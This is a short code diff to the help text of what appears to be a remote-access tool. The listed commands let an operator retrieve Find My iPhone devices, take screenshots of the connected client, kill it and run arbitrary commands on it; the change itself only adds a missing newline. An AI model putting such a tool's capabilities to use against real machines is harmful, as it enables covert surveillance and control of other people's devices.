@@ -216,7 +216,7 @@ def get_help():
     help += "find_my_iphone    -  Retrieve find my iphone devices.\n"
     help += "screenshot        -  Takes a screenshot of the client.\n"
     help += "kill_client       -  Brutally kill the client (removes the server).\n"
-    help += "exit              -  Exits the session."
+    help += "exit              -  Exits the session.\n"
     help += "Any other command will be executed on the connected client."
     return help
 
